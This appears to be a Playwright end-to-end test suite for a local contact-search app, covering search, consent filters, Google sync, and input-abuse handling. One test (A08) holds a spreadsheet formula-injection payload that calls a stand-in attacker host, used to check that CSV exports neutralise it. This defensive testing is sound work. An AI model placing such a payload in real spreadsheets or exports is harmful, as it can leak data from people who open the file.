import { expect, test } from "@playwright/test";
import { spawn } from "node:child_process";
import fsp from "node:fs/promises";
import os from "node:os";
import path from "node:path";

const API = "http://127.0.0.1:5178";

test.beforeEach(async ({ request }) => {
  const response = await request.delete(`${API}/api/contacts`);
  expect(response.ok()).toBe(true);
});

async function loadSample(page) {
  await page.goto("/");
  await page.getByRole("button", { name: "Load Sample" }).click();
  await expect(page.locator(".result-card")).toHaveCount(1);
}

async function addContact(request, overrides = {}) {
  const response = await request.post(`${API}/api/contacts`, {
    data: {
      name: "Synthetic Contact",
      emails: ["synthetic.contact@example.invalid"],
      orgs: ["Synthetic Health Network"],
      titles: ["Digital Health Director"],
      locations: ["Raleigh, North Carolina"],
      bio: "Synthetic digital health and community health evidence.",
      notes: "No real person or relationship data.",
      tags: ["digital health"],
      sources: { google: true },
      consent: "share-ok",
      evidence: [{ source: "Fixture", text: "Synthetic public evidence." }],
      ...overrides
    }
  });
  expect(response.ok()).toBe(true);
  return (await response.json()).contact;
}

async function waitForHealth(url) {
  await expect
    .poll(async () => {
      try {
        return (await fetch(url)).ok;
      } catch {
        return false;
      }
    })
    .toBe(true);
}

test("U01 local application and status render", async ({ page }) => {
  await page.goto("/");
  await expect(page).toHaveTitle("Network Radar");
  await page.getByRole("button", { name: "Tools" }).click();
  await expect(page.locator("#serverStatus")).toHaveText("Google ready");
});

test("U02 sample contact loads through the running backend", async ({ page }) => {
  await loadSample(page);
  await expect(page.locator(".result-card")).toContainText("Ana Morales");
});

test("U03 evidence search returns the relevant contact", async ({ page }) => {
  await loadSample(page);
  await page.locator("#queryInput").fill("Colombia M&E");
  await expect(page.locator(".result-card")).toContainText("Ana Morales");
});

test("U04 selecting a result exposes evidence and consent", async ({ page }) => {
  await loadSample(page);
  await page.locator(".result-card").click();
  await expect(page.locator("#detailPanel")).toContainText("Ask first");
  await expect(page.locator("#detailPanel")).toContainText("Representative local sample");
});

test("U05 consent gate hides do-not-share contacts", async ({ page, request }) => {
  await addContact(request, { name: "Visible Fixture", emails: ["visible@example.invalid"] });
  await addContact(request, {
    name: "Hidden Fixture",
    emails: ["hidden@example.invalid"],
    consent: "do-not-share"
  });
  await page.goto("/");
  await page.locator("#queryInput").fill("");
  await expect(page.locator(".result-card")).toHaveCount(2);
  await page.locator("#consentGate").check();
  await expect(page.locator(".result-card")).toHaveCount(1);
  await expect(page.locator(".result-card")).toContainText("Visible Fixture");
});

test("U06 organization filter narrows the shortlist", async ({ page, request }) => {
  await addContact(request);
  await addContact(request, {
    name: "Other Organization Fixture",
    emails: ["other@example.invalid"],
    orgs: ["Different Network"]
  });
  await page.goto("/");
  await page.locator("#queryInput").fill("");
  await page.locator("#orgFilter").fill("Synthetic Health Network");
  await expect(page.locator(".result-card")).toHaveCount(1);
});

test("U07 topic filter uses transparent tags", async ({ page, request }) => {
  await addContact(request);
  await addContact(request, {
    name: "Agriculture Fixture",
    emails: ["agriculture@example.invalid"],
    titles: ["Agriculture Director"],
    tags: ["agriculture"],
    bio: "Synthetic agriculture evidence."
  });
  await page.goto("/");
  await page.locator("#queryInput").fill("");
  await page.locator("#topicFilter").fill("digital health");
  await expect(page.locator(".result-card")).toHaveCount(1);
});

test("U08 duplicate email imports merge and preserve source flags", async ({ request }) => {
  const first = await addContact(request);
  const second = await addContact(request, {
    name: "Renamed Synthetic Contact",
    sources: { linkedin: true }
  });
  expect(second.id).toBe(first.id);
  expect(second.sources.google).toBe(true);
  expect(second.sources.linkedin).toBe(true);
  const list = await request.get(`${API}/api/contacts?limit=20`);
  expect((await list.json()).total).toBe(1);
});

test("U09 Google Contacts sync uses an isolated connector", async ({ request }) => {
  const response = await request.post(`${API}/api/google/sync-contacts`);
  expect(response.ok()).toBe(true);
  expect((await response.json()).imported).toBe(1);
  const list = await request.get(`${API}/api/contacts?q=Google%20Fixture`);
  expect((await list.json()).contacts[0].contact.sources.google).toBe(true);
});

test("U10 Gmail sync records evidence and warmth locally", async ({ request }) => {
  const response = await request.post(`${API}/api/google/sync-gmail`, {
    data: { query: "synthetic", max: 1 }
  });
  expect(response.ok()).toBe(true);
  expect((await response.json()).importedMessages).toBe(1);
  const list = await request.get(`${API}/api/contacts?q=synthetic%20digital%20health`);
  expect((await list.json()).contacts.length).toBeGreaterThan(0);
});

test("A01 malformed JSON receives a controlled 400", async () => {
  const response = await fetch(`${API}/api/contacts`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: "{not-json"
  });
  expect(response.status).toBe(400);
  expect((await response.json()).code).toBe("invalid_json");
});

test("A02 request bodies over 1 MB receive 413", async () => {
  const response = await fetch(`${API}/api/contacts`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ name: "Large Fixture", notes: "x".repeat(1000100) })
  });
  expect(response.status).toBe(413);
  expect((await response.json()).code).toBe("request_too_large");
});

test("A03 empty contacts are rejected", async ({ request }) => {
  const response = await request.post(`${API}/api/contacts`, { data: {} });
  expect(response.status()).toBe(422);
  expect((await response.json()).code).toBe("invalid_contact");
});

test("A04 abusive list limits are clamped", async ({ request }) => {
  const response = await request.get(`${API}/api/contacts?limit=999999`);
  expect(response.ok()).toBe(true);
  expect((await response.json()).limit).toBe(500);
});

test("A05 missing OpenAI key fails closed", async () => {
  const dataDir = await fsp.mkdtemp(path.join(os.tmpdir(), "network-radar-no-key-"));
  const env = {
    ...process.env,
    PORT: "5179",
    NETWORK_RADAR_DATA_DIR: dataDir,
    NETWORK_RADAR_EXPORT_DIR: path.join(dataDir, "exports")
  };
  delete env.OPENAI_API_KEY;
  const child = spawn(process.execPath, ["server.mjs"], {
    cwd: process.cwd(),
    env,
    stdio: "ignore"
  });
  try {
    await waitForHealth("http://127.0.0.1:5179/api/health");
    const response = await fetch("http://127.0.0.1:5179/api/openai/enrich", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "{}"
    });
    expect(response.status).toBe(503);
    expect((await response.json()).code).toBe("openai_not_configured");
  } finally {
    child.kill("SIGTERM");
    await fsp.rm(dataDir, { recursive: true, force: true });
  }
});

test("A06 malformed AI tags cannot corrupt a contact", async ({ request }) => {
  await addContact(request, {
    name: "Malformed AI Fixture",
    emails: ["malformed-ai@example.invalid"],
    tags: []
  });
  const response = await request.post(`${API}/api/openai/enrich`, { data: { limit: 1 } });
  expect(response.ok()).toBe(true);
  const list = await request.get(`${API}/api/contacts?q=Malformed`);
  expect(Array.isArray((await list.json()).contacts[0].contact.tags)).toBe(true);
});

test("A07 provider rate limits remain visible", async ({ request }) => {
  await addContact(request, {
    name: "Rate Limited AI Fixture",
    emails: ["rate-limited@example.invalid"]
  });
  const response = await request.post(`${API}/api/openai/enrich`, { data: { limit: 1 } });
  expect(response.status()).toBe(429);
  expect((await response.json()).code).toBe("openai_embedding_failed");
});

test("A08 public CSV neutralizes spreadsheet formulas and omits email", async ({ request }) => {
  await addContact(request, {
    name: "=WEBSERVICE(\"https://attacker.invalid\")",
    emails: ["private@example.invalid"]
  });
  const response = await request.get(`${API}/api/export/public-shortlist`);
  const csv = await response.text();
  expect(csv).toContain("'=WEBSERVICE");
  expect(csv).not.toContain("private@example.invalid");
});

test("A09 empty LinkedIn searches are rejected before browser use", async ({ request }) => {
  const response = await request.post(`${API}/api/linkedin/search`, { data: { query: "" } });
  expect(response.status()).toBe(422);
  expect((await response.json()).code).toBe("invalid_linkedin_query");
});

test("A10 Google OAuth state mismatch is contained", async ({ request }) => {
  const response = await request.get(`${API}/auth/google/callback?state=wrong&code=synthetic`);
  expect(response.status()).toBe(400);
  expect((await response.json()).code).toBe("oauth_state_mismatch");
});
